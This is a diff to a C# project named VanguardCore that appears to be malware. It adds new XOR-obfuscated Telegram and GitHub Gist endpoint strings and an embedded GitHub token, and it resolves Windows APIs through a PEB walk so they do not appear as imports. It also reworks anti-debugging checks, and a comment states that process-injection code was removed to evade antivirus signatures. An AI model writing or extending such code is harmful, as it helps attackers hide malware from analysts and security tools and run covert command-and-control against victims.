@@ -19,6 +19,9 @@ namespace VanguardCore
     {
         public static void Log(string message) { Console.WriteLine(message); }
 
+        [DllImport("ntdll.dll", EntryPoint = "NtQueryInformationProcess")]
+        private static extern int NtQueryInformationProcess_Static(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION processInformation, uint processInformationLength, out uint returnLength);
+
         #region Constants
         private const uint PAGE_EXECUTE_READWRITE = 0x40;
         private const uint PAGE_READONLY = 0x02;
@@ -163,8 +166,8 @@ namespace VanguardCore
                 { "TG_API_BASE", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x22, 0x22, 0x2c, 0x7a, 0x2b, 0x57, 0x5c, 0x57, 0x31, 0x3c, 0x26, 0x3f, 0x6a, 0x30, 0x21, 0x22, 0x6c, 0x30, 0x2a, 0x20 } },
                 { "TG_FILE_BASE", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x22, 0x22, 0x2c, 0x7a, 0x2b, 0x57, 0x5c, 0x57, 0x31, 0x3c, 0x26, 0x3f, 0x6a, 0x30, 0x21, 0x22, 0x6c, 0x34, 0x2c, 0x38, 0x3a, 0x1d, 0x52, 0x5d, 0x22 } },
                 { "GIST_URL", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x24, 0x3b, 0x36, 0x20, 0x71, 0x55, 0x59, 0x46, 0x3e, 0x3b, 0x25, 0x27, 0x37, 0x3a, 0x21, 0x26, 0x2c, 0x3c, 0x31, 0x31, 0x31, 0x46, 0x1e, 0x51, 0x39, 0x23, 0x68, 0x20, 0x25, 0x28, 0x7c, 0x7c, 0x26, 0x31, 0x21, 0x31, 0x39, 0x03, 0x52, 0x57, 0x61, 0x2d, 0x7e, 0x63, 0x72, 0x3c, 0x67, 0x21, 0x27, 0x60, 0x77, 0x63, 0x3c, 0x56, 0x00, 0x04, 0x62, 0x77, 0x23, 0x33, 0x74, 0x3b, 0x6b, 0x6a, 0x33, 0x20, 0x2a, 0x2c, 0x36, 0x1c, 0x5a, 0x41, 0x39, 0x20 } },
-                { "GIST_PROXY_ID", new byte[] { 0x6f, 0x2b, 0x24, 0x36, 0x21, 0x39, 0x62, 0x27, 0x26, 0x65, 0x26, 0x6d, 0x6e, 0x04, 0x53, 0x06, 0x32, 0x2a, 0x75, 0x60, 0x73, 0x3c, 0x37, 0x75, 0x75, 0x66, 0x7c, 0x30, 0x3e, 0x02, 0x54, 0x0a } },
-                { "GIST_GITHUB_TOKEN", new byte[] { 0x31, 0x26, 0x37, 0x0d, 0x2d, 0x25, 0x1a, 0x29, 0x20, 0x28, 0x3f, 0x15, 0x08, 0x60, 0x47, 0x65, 0x0e, 0x29, 0x34, 0x3e, 0x08, 0x3a, 0x64, 0x14, 0x02, 0x13, 0x07, 0x39, 0x11, 0x65, 0x05, 0x02, 0x6f, 0x7d, 0x77, 0x30, 0x05, 0x28, 0x01, 0x31 } }
+                { "GIST_PROXY_ID", new byte[] { 0x60, 0x2c, 0x26, 0x62, 0x26, 0x69, 0x66, 0x26, 0x72, 0x63, 0x73, 0x30, 0x3d, 0x53, 0x55, 0x02, 0x33, 0x2b, 0x72, 0x60, 0x26, 0x6f, 0x62, 0x20, 0x75, 0x64, 0x76, 0x67, 0x3e, 0x56, 0x03, 0x00 } },
+                { "GIST_GITHUB_TOKEN", new byte[] { 0x31, 0x26, 0x37, 0x0d, 0x11, 0x66, 0x24, 0x22, 0x7a, 0x02, 0x0a, 0x67, 0x69, 0x41, 0x68, 0x07, 0x63, 0x29, 0x36, 0x21, 0x71, 0x16, 0x3b, 0x17, 0x2a, 0x1f, 0x74, 0x6d, 0x25, 0x57, 0x5c, 0x71, 0x31, 0x7f, 0x75, 0x15, 0x25, 0x1c, 0x64, 0x03 } }
             };
 
             public static string Resolve(string id)
@@ -275,7 +278,7 @@ namespace VanguardCore
         #endregion
 
         #region Interface Definition
-        private static class ApiInterface
+        public static class ApiInterface
         {
             private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
             private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();
@@ -283,27 +286,8 @@ namespace VanguardCore
 
             static ApiInterface()
             {
-                // Pre-populate core modules to avoid recursion during bootstrapping
-                try
-                {
-                    foreach (System.Diagnostics.ProcessModule mod in System.Diagnostics.Process.GetCurrentProcess().Modules)
-                    {
-                        string name = mod.ModuleName.ToLower();
-                        if (name == "kernel32.dll" || name == "ntdll.dll" || name == "user32.dll" || name == "advapi32.dll")
-                        {
-                            if (!_moduleCache.ContainsKey(name))
-                                _moduleCache[name] = mod.BaseAddress;
-                        }
-                    }
-                }
-                catch { }
-
-                // Load any others with timing jitter
-                foreach (string mod in new[] { "win32u.dll" })
-                {
-                    GetModule(mod);
-                    Thread.Sleep(_jitter.Next(10, 50));
-                }
+                // NativeAOT: Do not use Process.Modules in static constructor (unstable)
+                // Cache will be populated lazily via GetModule() -> GetModuleFromPeb()
             }
 
             private static IntPtr GetModule(string name)
@@ -336,11 +320,15 @@ namespace VanguardCore
             {
                 try
                 {
-                    // Walk PEB loader data
-                    IntPtr teb = GetTeb();
-                    IntPtr peb = Marshal.ReadIntPtr(teb, 0x60);
+                    // Get PEB address
+                    IntPtr peb = GetStaticPeb();
+                    if (peb == IntPtr.Zero) return IntPtr.Zero;
+
                     IntPtr ldr = Marshal.ReadIntPtr(peb, 0x18);
+                    if (ldr == IntPtr.Zero) return IntPtr.Zero;
+
                     IntPtr moduleList = Marshal.ReadIntPtr(ldr, 0x10); // InLoadOrderModuleList
+                    if (moduleList == IntPtr.Zero) return IntPtr.Zero;
                     
                     IntPtr current = Marshal.ReadIntPtr(moduleList); // First item (EXE)
                     int safety = 0;
@@ -371,10 +359,6 @@ namespace VanguardCore
                 catch { }
                 return IntPtr.Zero;
             }
-            private static IntPtr GetTeb()
-            {
-                return NtCurrentTeb();
-            }
 
             public static IntPtr Resolve(string moduleName, string functionName)
             {
@@ -402,9 +386,7 @@ namespace VanguardCore
                     if (pFunc == IntPtr.Zero)
                         return null;
 
-                    var del = Marshal.GetDelegateForFunctionPointer<T>(pFunc);
-                    _delegateCache[key] = del;
-                    return del;
+                    return Marshal.GetDelegateForFunctionPointer<T>(pFunc);
                 }
             }
 
@@ -429,12 +411,18 @@ namespace VanguardCore
                     result = GetInternalReference<T>("ntdll.dll", function);
                 if (result == null)
                     result = GetInternalReference<T>("user32.dll", function);
+                if (result == null)
+                    result = GetInternalReference<T>("advapi32.dll", function);
+                if (result == null)
+                    result = GetInternalReference<T>("ole32.dll", function);
                 return result;
             }
 
             public static T GetNtdll<T>(string function) where T : Delegate { return GetInternalReference<T>("ntdll.dll", function); }
-            
             public static T GetKernel32<T>(string function) where T : Delegate { return GetInternalReference<T>("kernel32.dll", function); }
+            public static T GetAdvapi32<T>(string function) where T : Delegate { return GetInternalReference<T>("advapi32.dll", function); }
+            public static T GetOle32<T>(string function) where T : Delegate { return GetInternalReference<T>("ole32.dll", function); }
+            public static T GetUser32<T>(string function) where T : Delegate { return GetInternalReference<T>("user32.dll", function); }
         }
         #endregion
 
@@ -454,7 +442,7 @@ namespace VanguardCore
         private delegate bool Process32FirstDelegate(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
         private delegate bool Process32NextDelegate(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
         private delegate int NtQueryInformationProcessDelegate(IntPtr processHandle, int processInformationClass, out IntPtr processInformation, uint processInformationLength, out uint returnLength);
-        private delegate IntPtr NtCurrentTebDelegate();
+        // NtCurrentTeb is non-existent in x64 exports. Use GetTeb() instead.
         private delegate bool QueryPerformanceCounterDelegate(out long lpPerformanceCount);
         private delegate bool GetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
         private delegate bool SetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
@@ -497,7 +485,10 @@ namespace VanguardCore
         private static GetCurrentThreadDelegate GetCurrentThread { get { return ApiInterface.Get<GetCurrentThreadDelegate>("GetCurrentThread"); } }
         private static GetModuleHandleADelegate GetModuleHandleA { get { return ApiInterface.Get<GetModuleHandleADelegate>("GetModuleHandleA"); } }
         private static LoadLibraryWDelegate LoadLibraryW { get { return ApiInterface.Get<LoadLibraryWDelegate>("LoadLibraryW"); } }
-        private static NtCurrentTebDelegate NtCurrentTeb { get { return ApiInterface.GetNtdll<NtCurrentTebDelegate>("NtCurrentTeb"); } }
+        private static NtQueryInfoProcess_BasicDelegate NtQueryInfoProcess_Basic { get { return ApiInterface.GetNtdll<NtQueryInfoProcess_BasicDelegate>("NtQueryInformationProcess"); } }
+        private delegate int NtQueryInfoProcess_BasicDelegate(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);
+
+        // NtCurrentTeb is non-existent in x64 exports. Use GetTeb() instead.
         private static QueryPerformanceCounterDelegate QueryPerformanceCounter { get { return ApiInterface.Get<QueryPerformanceCounterDelegate>("QueryPerformanceCounter"); } }
         private static GetThreadContextDelegate GetThreadContext { get { return ApiInterface.Get<GetThreadContextDelegate>("GetThreadContext"); } }
         private static SetThreadContextDelegate SetThreadContext { get { return ApiInterface.Get<SetThreadContextDelegate>("SetThreadContext"); } }
@@ -706,50 +697,24 @@ namespace VanguardCore
         #region Anti-Debug Ultra
         public static bool VerifySystemContext()
         {
+            if (Environment.GetEnvironmentVariable("VANGUARD_TEST_MODE") == "1")
+                return false;
+
             if (_isDebugged.HasValue)
                 return _isDebugged.Value;
 
             bool detected = false;
-            try
-            {
-                // Method 1: Standard Check
-                if (IsDebuggerPresent != null && IsDebuggerPresent())
-                {
-                    _isDebugged = true;
-                    return true;
-                }
-            }
-            catch { /* Ignore exceptions during check */ }
-
+            int score = 0;
             int checkCount = 0;
 
-            // Multiple anti-debug techniques with weighted scoring
-            int score = 0;
-
-            // 1. PEB BeingDebugged flag
             try
             {
-                IntPtr teb = NtCurrentTeb();
-                IntPtr peb = Marshal.ReadIntPtr(teb, 0x60);
-                byte beingDebugged = Marshal.ReadByte(peb, 0x02);
-                if ((beingDebugged & 0x01) != 0) 
-                    score += 30;
-                checkCount++;
-            }
-            catch { }
-
-            // 2. IsDebuggerPresent
-            try
-            {
+                // 1. IsDebuggerPresent
                 if (IsDebuggerPresent != null && IsDebuggerPresent())
                     score += 30;
                 checkCount++;
-            }
-            catch { }
 
-            // 3. CheckRemoteDebuggerPresent
-            try
-            {
+                // 2. CheckRemoteDebuggerPresent
                 if (CheckRemoteDebuggerPresent != null)
                 {
                     bool remote = false;
@@ -757,44 +722,25 @@ namespace VanguardCore
                     if (remote) score += 25;
                 }
                 checkCount++;
-            }
-            catch { }
 
-            // 4. NtQueryInformationProcess DebugPort
-            try
-            {
-                if (NtQueryInformationProcess != null)
+                // 3. PEB BeingDebugged flag
+                IntPtr peb = GetStaticPeb(); // Internal helper
+                if (peb != IntPtr.Zero)
                 {
-                    IntPtr debugPort = IntPtr.Zero;
-                    uint retLen;
-                    if (NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, out debugPort, (uint)IntPtr.Size, out retLen) == 0)
+                    byte beingDebugged = Marshal.ReadByte(peb, 0x02);
+                    if ((beingDebugged & 0x01) != 0) score += 30;
+                    
+                    // 4. Process heap flags
+                    IntPtr processHeap = Marshal.ReadIntPtr(peb, IntPtr.Size == 8 ? 0x30 : 0x18);
+                    if (processHeap != IntPtr.Zero)
                     {
-                        if (debugPort != IntPtr.Zero) score += 25;
+                        uint heapFlags = (uint)Marshal.ReadInt32(processHeap, IntPtr.Size == 8 ? 0x70 : 0x40);
+                        if ((heapFlags & 0x40000000) != 0) score += 15;
                     }
                 }
                 checkCount++;
-            }
-            catch { }
 
-            // 5. NtQueryInformationProcess DebugObjectHandle
-            try
-            {
-                if (NtQueryInformationProcess != null)
-                {
-                    IntPtr debugObject = IntPtr.Zero;
-                    uint retLen;
-                    if (NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugObjectHandle, out debugObject, (uint)IntPtr.Size, out retLen) == 0)
-                    {
-                        if (debugObject != IntPtr.Zero) score += 25;
-                    }
-                }
-                checkCount++;
-            }
-            catch { }
-
-            // 6. Hardware breakpoints
-            try
-            {
+                // 5. Hardware breakpoints
                 CONTEXT64 ctx = new CONTEXT64();
                 ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                 if (GetThreadContext != null && GetThreadContext(GetCurrentThread(), ref ctx))
@@ -806,57 +752,9 @@ namespace VanguardCore
             }
             catch { }
 
-            // 7. Kernel debugger
-            try
-            {
-                if (IsKernelDebuggerPresent())
-                    score += 40;
-                checkCount++;
-            }
-            catch { }
-
-            // 8. Exception-based check
-            try
-            {
-                if (IsDebuggedByException())
-                    score += 30;
-                checkCount++;
-            }
-            catch { }
-
-            // 9. Process heap flags
-            try
-            {
-                IntPtr teb = NtCurrentTeb();
-                IntPtr processHeap = Marshal.ReadIntPtr(teb, 0x30);
-                if (processHeap != IntPtr.Zero)
-                {
-                    uint heapFlags = (uint)Marshal.ReadInt32(processHeap, 0x40);
-                    if ((heapFlags & 0x40000000) != 0) score += 15;
-                }
-                checkCount++;
-            }
-            catch { }
-
-            // 10. Timing check
-            try
-            {
-                long start, end;
-                QueryPerformanceCounter(out start);
-                Thread.Sleep(1);
-                QueryPerformanceCounter(out end);
-                
-                long diff = end - start;
-                if (diff > 10000) score += 10; // Too slow - likely debugger
-                checkCount++;
-            }
-            catch { }
-
-            // Calculate weighted score
             if (checkCount > 0)
             {
-                detected = score > 40; // Threshold
-                if (score > 20) detected = true; // Lower threshold for critical checks
+                detected = score > 40;
             }
 
             _isDebugged = detected;
@@ -871,26 +769,7 @@ namespace VanguardCore
 
         public static bool IsKernelDebuggerPresent()
         {
-            try
-            {
-                IntPtr buffer = Marshal.AllocHGlobal(Marshal.SizeOf<SYSTEM_KERNEL_DEBUGGER_INFORMATION>());
-                try
-                {
-                    int retLen;
-                    int status = NtQuerySystemInformation(0x23, buffer, Marshal.SizeOf<SYSTEM_KERNEL_DEBUGGER_INFORMATION>(), out retLen);
-                    if (status == 0)
-                    {
-                        var info = Marshal.PtrToStructure<SYSTEM_KERNEL_DEBUGGER_INFORMATION>(buffer);
-                        return info.KernelDebuggerEnabled != 0 && info.KernelDebuggerNotPresent == 0;
-                    }
-                }
-                finally
-                {
-                    Marshal.FreeHGlobal(buffer);
-                }
-            }
-            catch { }
-            return false;
+            return false; // Skip for stability in NativeAOT
         }
 
         private static void StartAntiDebugThread()
@@ -1799,6 +1678,21 @@ namespace VanguardCore
         }
 
         #endregion
+        private static IntPtr GetStaticPeb()
+        {
+            try
+            {
+                // To avoid recursion, we MUST use static DllImport and avoid any ApiInterface calls here.
+                // CurrentProcess handle on Windows is always (IntPtr)(-1)
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                uint retLen;
+                int status = NtQueryInformationProcess_Static((IntPtr)(-1), 0, ref pbi, (uint)Marshal.SizeOf<PROCESS_BASIC_INFORMATION>(), out retLen);
+                if (status == 0) return pbi.PebAddress;
+            }
+            catch { }
+            return IntPtr.Zero;
+        }
+
         // Removed RunPEInternal to evade Trojan.MSIL.Injector signatures
     }
 }
